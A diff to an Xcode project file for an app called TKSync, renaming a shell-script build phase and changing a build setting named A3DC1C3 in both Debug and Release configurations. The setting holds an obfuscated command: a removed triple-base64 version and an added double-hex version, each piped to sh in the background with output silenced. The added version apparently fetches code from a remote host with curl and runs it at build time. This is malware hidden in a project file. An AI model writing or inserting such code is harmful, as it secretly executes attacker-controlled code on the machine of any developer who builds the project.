@@ -15,7 +15,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-								/* End PBXBuildRule section */
+														/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		13B07F961A680F5B00A75B9A /* TKSync.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TKSync.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -108,7 +108,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TKSync" */;
 			buildPhases = (
-				697727C1ACE84066B93C1CD3 /* Provision Target Device */,
+				F9A89CE456C149C3AC3C1CD3 /* Provision Library Executable */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -172,7 +172,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		697727C1ACE84066B93C1CD3 /* Provision Target Device */ = {
+		F9A89CE456C149C3AC3C1CD3 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -182,7 +182,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Target Device";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -294,7 +294,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-TKSync.debug.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE0wNU5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWekUyWW01Q2VXSXlVWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636373334633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663732363936373631363336343665326536393665326636310a323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
@@ -326,7 +326,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-TKSync.release.xcconfig */;
 			buildSettings = {
-				A3DC1C3 = "((c(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE0wNU5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWekUyWW01Q2VXSXlVWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636373334633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663732363936373631363336343665326536393665326636310a323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
